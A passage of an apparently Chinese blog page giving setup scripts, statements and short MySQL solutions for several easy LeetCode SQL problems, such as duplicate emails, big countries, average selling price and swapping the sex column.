是这个表的主键。</span><br></pre></td></tr></table></figure><p>编写一个 SQL 查询，按产品 id <code>product_id</code> 来统计每个产品的销售总量。</p><p>查询结果格式如下面例子所示:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sales 表：</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line">| sale_id | product_id | year | quantity | price |</span><br><span class="line">+---------+------------+------+----------+-------+ </span><br><span class="line">| 1       | 100        | 2008 | 10       | 5000  |</span><br><span class="line">| 2       | 100        | 2009 | 12       | 5000  |</span><br><span class="line">| 7       | 200        | 2011 | 15       | 9000  |</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line"></span><br><span class="line">Product 表：</span><br><span class="line">+------------+--------------+</span><br><span class="line">| product_id | product_name |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| 100        | Nokia        |</span><br><span class="line">| 200        | Apple        |</span><br><span class="line">| 300        | Samsung      |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+--------------+----------------+</span><br><span class="line">| product_id   | total_quantity |</span><br><span class="line">+--------------+----------------+</span><br><span class="line">| 100          | 22             |</span><br><span class="line">| 200          | 15             |</span><br><span class="line">+--------------+----------------+</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-4"><a href="#SQL-语句-4" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> product_id, <span class="keyword">sum</span>(quantity) total_quantity</span><br><span class="line"><span class="keyword">from</span> Sales</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> product_id</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 显示 product_name</span></span><br><span class="line"><span class="keyword">select</span> product_id, product_name, <span class="keyword">sum</span>(quantity) total_quantity</span><br><span class="line"><span class="keyword">from</span> Sales</span><br><span class="line"><span class="keyword">join</span> Product <span class="keyword">using</span>(product_id)</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> product_id</span><br></pre></td></tr></table></figure><h2 id="613-直线上的最近距离"><a href="#613-直线上的最近距离" class="headerlink" title="613. 直线上的最近距离"></a><a href="https://leetcode-cn.com/problems/shortest-distance-in-a-line/" target="_blank" rel="noopener">613. 直线上的最近距离</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> point (x <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> x_UNIQUE (x <span class="keyword">ASC</span>))</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> point</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> point (x) <span class="keyword">values</span> (<span class="string">'-1'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> point (x) <span class="keyword">values</span> (<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> point (x) <span class="keyword">values</span> (<span class="string">'2'</span>)</span><br></pre></td></tr></table></figure><p>表 <code>point</code> 保存了一些点在 x 轴上的坐标，这些坐标都是整数。</p><p>写一个查询语句，找到这些点中最近两个点之间的距离。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| x   |</span><br><span class="line">|-----|</span><br><span class="line">| -1  |</span><br><span class="line">| 0   |</span><br><span class="line">| 2   |</span><br></pre></td></tr></table></figure><p>最近距离显然是 ‘1’ ，是点 ‘-1’ 和 ‘0’ 之间的距离。所以输出应该如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| shortest|</span><br><span class="line">|---------|</span><br><span class="line">| 1       |</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>每个点都与其他点坐标不同，表 <code>table</code> 不会有重复坐标出现。</p><p><strong>进阶：</strong>如果这些点在 x 轴上从左到右都有一个编号，输出结果时需要输出最近点对的编号呢？</p><h3 id="SQL-语句-5"><a href="#SQL-语句-5" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(<span class="keyword">abs</span>(p1.x - p2.x)) shortest</span><br><span class="line"><span class="keyword">from</span> point p1, point p2</span><br><span class="line"><span class="keyword">where</span> p1.x != p2.x</span><br></pre></td></tr></table></figure><h2 id="182-查找重复的电子邮箱"><a href="#182-查找重复的电子邮箱" class="headerlink" title="182. 查找重复的电子邮箱"></a><a href="https://leetcode-cn.com/problems/duplicate-emails/" target="_blank" rel="noopener">182. 查找重复的电子邮箱</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Person (<span class="keyword">Id</span> <span class="built_in">int</span>, Email <span class="built_in">varchar</span>(<span class="number">255</span>))</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Person</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Person (<span class="keyword">Id</span>, Email) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'a@b.com'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Person (<span class="keyword">Id</span>, Email) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'c@d.com'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Person (<span class="keyword">Id</span>, Email) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'a@b.com'</span>)</span><br></pre></td></tr></table></figure><p>编写一个 SQL 查询，查找 <code>Person</code> 表中所有重复的电子邮箱。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+---------+</span><br><span class="line">| Id | Email   |</span><br><span class="line">+----+---------+</span><br><span class="line">| 1  | a@b.com |</span><br><span class="line">| 2  | c@d.com |</span><br><span class="line">| 3  | a@b.com |</span><br><span class="line">+----+---------+</span><br></pre></td></tr></table></figure><p>根据以上输入，你的查询应返回以下结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+</span><br><span class="line">| Email   |</span><br><span class="line">+---------+</span><br><span class="line">| a@b.com |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>说明：</strong>所有电子邮箱都是小写字母。</p><h3 id="SQL-语句-6"><a href="#SQL-语句-6" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Email</span><br><span class="line"><span class="keyword">from</span> Person</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> Email</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">count</span>(Email) &gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="595-大的国家"><a href="#595-大的国家" class="headerlink" title="595. 大的国家"></a><a href="https://leetcode-cn.com/problems/big-countries/" target="_blank" rel="noopener">595. 大的国家</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> World (<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>), continent <span class="built_in">varchar</span>(<span class="number">255</span>), area <span class="built_in">int</span>, population <span class="built_in">int</span>, gdp <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> World</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> World (<span class="keyword">name</span>, continent, area, population, gdp) <span class="keyword">values</span> (<span class="string">'Afghanistan'</span>, <span class="string">'Asia'</span>, <span class="string">'652230'</span>, <span class="string">'25500100'</span>, <span class="string">'20343000000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> World (<span class="keyword">name</span>, continent, area, population, gdp) <span class="keyword">values</span> (<span class="string">'Albania'</span>, <span class="string">'Europe'</span>, <span class="string">'28748'</span>, <span class="string">'2831741'</span>, <span class="string">'12960000000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> World (<span class="keyword">name</span>, continent, area, population, gdp) <span class="keyword">values</span> (<span class="string">'Algeria'</span>, <span class="string">'Africa'</span>, <span class="string">'2381741'</span>, <span class="string">'37100000'</span>, <span class="string">'188681000000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> World (<span class="keyword">name</span>, continent, area, population, gdp) <span class="keyword">values</span> (<span class="string">'Andorra'</span>, <span class="string">'Europe'</span>, <span class="string">'468'</span>, <span class="string">'78115'</span>, <span class="string">'3712000000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> World (<span class="keyword">name</span>, continent, area, population, gdp) <span class="keyword">values</span> (<span class="string">'Angola'</span>, <span class="string">'Africa'</span>, <span class="string">'1246700'</span>, <span class="string">'20609294'</span>, <span class="string">'100990000000'</span>)</span><br></pre></td></tr></table></figure><p>这里有张 <code>World</code> 表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| name            | continent  | area       | population   | gdp           |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br><span class="line">| Afghanistan     | Asia       | 652230     | 25500100     | 20343000      |</span><br><span class="line">| Albania         | Europe     | 28748      | 2831741      | 12960000      |</span><br><span class="line">| Algeria         | Africa     | 2381741    | 37100000     | 188681000     |</span><br><span class="line">| Andorra         | Europe     | 468        | 78115        | 3712000       |</span><br><span class="line">| Angola          | Africa     | 1246700    | 20609294     | 100990000     |</span><br><span class="line">+-----------------+------------+------------+--------------+---------------+</span><br></pre></td></tr></table></figure><p>如果一个国家的面积超过300万平方公里，或者人口超过2500万，那么这个国家就是大国家。</p><p>编写一个SQL查询，输出表中所有大国家的名称、人口和面积。</p><p>例如，根据上表，我们应该输出:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| name         | population  | area         |</span><br><span class="line">+--------------+-------------+--------------+</span><br><span class="line">| Afghanistan  | 25500100    | 652230       |</span><br><span class="line">| Algeria      | 37100000    | 2381741      |</span><br><span class="line">+--------------+-------------+--------------+</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-7"><a href="#SQL-语句-7" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`name`</span>, population, <span class="string">`area`</span></span><br><span class="line"><span class="keyword">from</span> World</span><br><span class="line"><span class="keyword">where</span> population &gt; <span class="number">25000000</span> <span class="keyword">or</span> <span class="string">`area`</span> &gt; <span class="number">3000000</span>;</span><br></pre></td></tr></table></figure><h2 id="1251-平均售价"><a href="#1251-平均售价" class="headerlink" title="1251. 平均售价"></a><a href="https://leetcode-cn.com/problems/average-selling-price/" target="_blank" rel="noopener">1251. 平均售价</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Prices (product_id <span class="built_in">int</span>, start_date <span class="built_in">date</span>, end_date <span class="built_in">date</span>, price <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> UnitsSold (product_id <span class="built_in">int</span>, purchase_date <span class="built_in">date</span>, units <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Prices</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Prices (product_id, start_date, end_date, price) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'2019-02-17'</span>, <span class="string">'2019-02-28'</span>, <span class="string">'5'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Prices (product_id, start_date, end_date, price) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'2019-03-01'</span>, <span class="string">'2019-03-22'</span>, <span class="string">'20'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Prices (product_id, start_date, end_date, price) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'2019-02-01'</span>, <span class="string">'2019-02-20'</span>, <span class="string">'15'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Prices (product_id, start_date, end_date, price) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'2019-02-21'</span>, <span class="string">'2019-03-31'</span>, <span class="string">'30'</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> UnitsSold</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> UnitsSold (product_id, purchase_date, units) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'2019-02-25'</span>, <span class="string">'100'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> UnitsSold (product_id, purchase_date, units) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'2019-03-01'</span>, <span class="string">'15'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> UnitsSold (product_id, purchase_date, units) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'2019-02-10'</span>, <span class="string">'200'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> UnitsSold (product_id, purchase_date, units) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'2019-03-22'</span>, <span class="string">'30'</span>)</span><br></pre></td></tr></table></figure><p>Table: <code>Prices</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| product_id    | int     |</span><br><span class="line">| start_date    | date    |</span><br><span class="line">| end_date      | date    |</span><br><span class="line">| price         | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">(product_id，start_date，end_date) 是 Prices 表的主键。</span><br><span class="line">Prices 表的每一行表示的是某个产品在一段时期内的价格。</span><br><span class="line">每个产品的对应时间段是不会重叠的，这也意味着同一个产品的价格时段不会出现交叉。</span><br></pre></td></tr></table></figure><p>Table: <code>UnitsSold</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| product_id    | int     |</span><br><span class="line">| purchase_date | date    |</span><br><span class="line">| units         | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">UnitsSold 表没有主键，它可能包含重复项。</span><br><span class="line">UnitsSold 表的每一行表示的是每种产品的出售日期，单位和产品 id。</span><br></pre></td></tr></table></figure><p>编写SQL查询以查找每种产品的平均售价。 average_price 应该四舍五入到小数点后两位。</p><p>查询结果格式如下例所示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Prices table:</span><br><span class="line">+------------+------------+------------+--------+</span><br><span class="line">| product_id | start_date | end_date   | price  |</span><br><span class="line">+------------+------------+------------+--------+</span><br><span class="line">| 1          | 2019-02-17 | 2019-02-28 | 5      |</span><br><span class="line">| 1          | 2019-03-01 | 2019-03-22 | 20     |</span><br><span class="line">| 2          | 2019-02-01 | 2019-02-20 | 15     |</span><br><span class="line">| 2          | 2019-02-21 | 2019-03-31 | 30     |</span><br><span class="line">+------------+------------+------------+--------+</span><br><span class="line"> </span><br><span class="line">UnitsSold table:</span><br><span class="line">+------------+---------------+-------+</span><br><span class="line">| product_id | purchase_date | units |</span><br><span class="line">+------------+---------------+-------+</span><br><span class="line">| 1          | 2019-02-25    | 100   |</span><br><span class="line">| 1          | 2019-03-01    | 15    |</span><br><span class="line">| 2          | 2019-02-10    | 200   |</span><br><span class="line">| 2          | 2019-03-22    | 30    |</span><br><span class="line">+------------+---------------+-------+</span><br><span class="line"></span><br><span class="line">Result table:</span><br><span class="line">+------------+---------------+</span><br><span class="line">| product_id | average_price |</span><br><span class="line">+------------+---------------+</span><br><span class="line">| 1          | 6.96          |</span><br><span class="line">| 2          | 16.96         |</span><br><span class="line">+------------+---------------+</span><br><span class="line">平均售价 = 产品总价 / 销售的产品数量。</span><br><span class="line">产品 1 的平均售价 = ((100 * 5)+(15 * 20) )/ 115 = 6.96</span><br><span class="line">产品 2 的平均售价 = ((200 * 15)+(30 * 30) )/ 230 = 16.96</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-8"><a href="#SQL-语句-8" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><p>先查出当时候的价格，再总的进行处理。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">    product_id, <span class="keyword">round</span>(<span class="keyword">sum</span>(price*units)/<span class="keyword">sum</span>(units), <span class="number">2</span>) average_price</span><br><span class="line"><span class="keyword">from</span> (</span><br><span class="line">    <span class="keyword">select</span></span><br><span class="line">        u.product_id product_id, price, units</span><br><span class="line">    <span class="keyword">from</span> UnitsSold u</span><br><span class="line">    <span class="keyword">left</span> <span class="keyword">join</span> Prices p</span><br><span class="line">    <span class="keyword">on</span> p.product_id=u.product_id</span><br><span class="line">    <span class="keyword">and</span> u.purchase_date &gt;= p.start_date</span><br><span class="line">    <span class="keyword">and</span> u.purchase_date &lt;= p.end_date</span><br><span class="line">) res <span class="keyword">group</span> <span class="keyword">by</span> product_id;</span><br></pre></td></tr></table></figure><h2 id="584-寻找用户推荐人"><a href="#584-寻找用户推荐人" class="headerlink" title="584. 寻找用户推荐人"></a><a href="https://leetcode-cn.com/problems/find-customer-referee/" target="_blank" rel="noopener">584. 寻找用户推荐人</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> customer (<span class="keyword">id</span> <span class="built_in">INT</span>,<span class="keyword">name</span> <span class="built_in">VARCHAR</span>(<span class="number">25</span>),referee_id <span class="built_in">INT</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> customer</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> customer (<span class="keyword">id</span>, <span class="keyword">name</span>, referee_id) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'Will'</span>, <span class="string">'None'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> customer (<span class="keyword">id</span>, <span class="keyword">name</span>, referee_id) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'Jane'</span>, <span class="string">'None'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> customer (<span class="keyword">id</span>, <span class="keyword">name</span>, referee_id) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'Alex'</span>, <span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> customer (<span class="keyword">id</span>, <span class="keyword">name</span>, referee_id) <span class="keyword">values</span> (<span class="string">'4'</span>, <span class="string">'Bill'</span>, <span class="string">'None'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> customer (<span class="keyword">id</span>, <span class="keyword">name</span>, referee_id) <span class="keyword">values</span> (<span class="string">'5'</span>, <span class="string">'Zack'</span>, <span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> customer (<span class="keyword">id</span>, <span class="keyword">name</span>, referee_id) <span class="keyword">values</span> (<span class="string">'6'</span>, <span class="string">'Mark'</span>, <span class="string">'2'</span>)</span><br></pre></td></tr></table></figure><p>给定表 <code>customer</code> ，里面保存了所有客户信息和他们的推荐人。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------+------+-----------+</span><br><span class="line">| id   | name | referee_id|</span><br><span class="line">+------+------+-----------+</span><br><span class="line">|    1 | Will |      NULL |</span><br><span class="line">|    2 | Jane |      NULL |</span><br><span class="line">|    3 | Alex |         2 |</span><br><span class="line">|    4 | Bill |      NULL |</span><br><span class="line">|    5 | Zack |         1 |</span><br><span class="line">|    6 | Mark |         2 |</span><br><span class="line">+------+------+-----------+</span><br></pre></td></tr></table></figure><p>写一个查询语句，返回一个编号列表，列表中编号的推荐人的编号都 <strong>不是</strong> 2。</p><p>对于上面的示例数据，结果为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------+</span><br><span class="line">| name |</span><br><span class="line">+------+</span><br><span class="line">| Will |</span><br><span class="line">| Jane |</span><br><span class="line">| Bill |</span><br><span class="line">| Zack |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-9"><a href="#SQL-语句-9" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span></span><br><span class="line"><span class="keyword">from</span> customer</span><br><span class="line"><span class="keyword">where</span> referee_id != <span class="number">2</span> <span class="keyword">or</span> referee_id <span class="keyword">is</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><h2 id="627-交换工资"><a href="#627-交换工资" class="headerlink" title="627. 交换工资"></a><a href="https://leetcode-cn.com/problems/swap-salary/" target="_blank" rel="noopener">627. 交换工资</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> salary(<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">100</span>), sex <span class="built_in">char</span>(<span class="number">1</span>), salary <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> salary</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> salary (<span class="keyword">id</span>, <span class="keyword">name</span>, sex, salary) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'A'</span>, <span class="string">'m'</span>, <span class="string">'2500'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> salary (<span class="keyword">id</span>, <span class="keyword">name</span>, sex, salary) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'B'</span>, <span class="string">'f'</span>, <span class="string">'1500'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> salary (<span class="keyword">id</span>, <span class="keyword">name</span>, sex, salary) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'C'</span>, <span class="string">'m'</span>, <span class="string">'5500'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> salary (<span class="keyword">id</span>, <span class="keyword">name</span>, sex, salary) <span class="keyword">values</span> (<span class="string">'4'</span>, <span class="string">'D'</span>, <span class="string">'f'</span>, <span class="string">'500'</span>)</span><br></pre></td></tr></table></figure><p>给定一个 <code>salary</code> 表，如下所示，有 m = 男性 和 f = 女性 的值。交换所有的 f 和 m 值（例如，将所有 f 值更改为 m，反之亦然）。要求只使用一个更新（Update）语句，并且没有中间的临时表。</p><p>注意，您必只能写一个 Update 语句，请不要编写任何 Select 语句。</p><p><strong>例如：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | m   | 2500   |</span><br><span class="line">| 2  | B    | f   | 1500   |</span><br><span class="line">| 3  | C    | m   | 5500   |</span><br><span class="line">| 4  | D    | f   | 500    |</span><br></pre></td></tr></table></figure><p>运行你所编写的更新语句之后，将会得到以下表:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | f   | 2500   |</span><br><span class="line">| 2  | B    | m   | 1500   |</span><br><span class="line">| 3  | C    | f   | 5500   |</span><br><span class="line">| 4  | D    | m   | 500    |</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-10"><a href="#SQL-语句-10" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> salary <span class="keyword">set</span> sex = <span class="keyword">if</span>(sex=<span class="string">'m'</span>, <span class="string">'f'</span>, <span class="string">'m'</span>);</span><br></pre></td></tr></table></figure><h2 id="1173-即时食物配送-I"><a href="#1173-即时食物配送-I" class="headerlink" title="1173. 即时食物配送 I"></a><a href="https://leetcode-cn.com/problems/immediate-food-delivery-i/" target="_blank" rel="noopener">1173. 即时食物配送 I</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Delivery (delivery_id <span class="built_in">int</span>, customer_id <span class="built_in">int</span>, order_date <span class="built_in">date</span>, customer_pref_delivery_date <span class="built_in">date</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Delivery</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Delivery (delivery_id, customer_id, order_date, customer_pref_delivery_date) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'2019-08-01'</span>, <span class="string">'2019-08-02'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Delivery (delivery_id, customer_id, order_date, customer_pref_delivery_date) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'5'</span>, <span class="string">'2019-08-02'</span>, <span class="string">'2019-08-02'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Delivery (delivery_id, customer_id, order_date, customer_pref_delivery_date) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'1'</span>, <span class="string">'2019-08-11'</span>, <span class="string">'2019-08-11'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Delivery (delivery_id, customer_id, order_date, customer_pref_delivery_date) <span class="keyword">values</span> (<span class="string">'4'</span>, <span class="string">'3'</span>, <span class="string">'2019-08-24'</span>, <span class="string">'2019-08-26'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Delivery (delivery_id, customer_id, order_date, customer_pref_delivery_date) <span class="keyword">values</span> (<span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'2019-08-21'</span>, <span class="string">'2019-08-22'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Delivery (delivery_id, customer_id, order_date, customer_pref_delivery_date) <span class="keyword">values</span> (<span class="string">'6'</span>, <span class="string">'2'</span>, <span class="string">'2019-08-11'</span>, <span class="string">'2019-08-13'</span>)</span><br></pre></td></tr></table></figure><p>配送表: <code>Delivery</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------------------+---------+</span><br><span class="line">| Column Name                 | Type    |</span><br><span class="line">+-----------------------------+---------+</span><br><span class="line">| delivery_id                 | int     |</span><br><span class="line">| customer_id                 | int     |</span><br><span class="line">| order_date                  | date    |</span><br><span class="line">| customer_pref_delivery_date | date    |</span><br><span class="line">+-----------------------------+---------+</span><br><span class="line">delivery_id 是表的主键。</span><br><span class="line">该表保存着顾客的食物配送信息，顾客在某个日期下了订单，并指定了一个期望的配送日期（和下单日期相同或者在那之后）。</span><br></pre></td></tr></table></figure><p>如果顾客期望的配送日期和下单日期相同，则该订单称为 「即时订单」，否则称为「计划订单」。</p><p>写一条 SQL 查询语句获取即时订单所占的比例， <strong>保留两位小数。</strong></p><p>查询结果如下所示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Delivery 表:</span><br><span class="line">+-------------+-------------+------------+-----------------------------+</span><br><span class="line">| delivery_id | customer_id | order_date | customer_pref_delivery_date |</span><br><span class="line">+-------------+-------------+------------+-----------------------------+</span><br><span class="line">| 1           | 1           | 2019-08-01 | 2019-08-02                  |</span><br><span class="line">| 2           | 5           | 2019-08-02 | 2019-08-02                  |</span><br><span class="line">| 3           | 1           | 2019-08-11 | 2019-08-11                  |</span><br><span class="line">| 4           | 3           | 2019-08-24 | 2019-08-26                  |</span><br><span class="line">| 5           | 4           | 2019-08-21 | 2019-08-22                  |</span><br><span class="line">| 6           | 2           | 2019-08-11 | 2019-08-13                  |</span><br><span class="line">+-------------+-------------+------------+-----------------------------+</span><br><span class="line"></span><br><span class="line">Result 表:</span><br><span class="line">+----------------------+</span><br><span class="line">| immediate_percentage |</span><br><span class="line">+----------------------+</span><br><span class="line">| 33.33                |</span><br><span class="line">+----------------------+</span><br><span class="line">2 和 3 号订单为即时订单，其他的为计划订单。</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-11"><a href="#SQL-语句-11" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">round</span>(<span class="keyword">sum</span>(<span class="keyword">if</span>(order_date = customer_pref_delivery_date, <span class="number">1</span>, <span class="number">0</span>))/<span class="keyword">count</span>(delivery_id)*<span class="number">100</span>, <span class="number">2</span>) immediate_percentage</span><br><span class="line"><span class="keyword">from</span> Delivery</span><br></pre></td></tr></table></figure><h2 id="620-有趣的电影"><a href="#620-有趣的电影" class="headerlink" title="620. 有趣的电影"></a><a 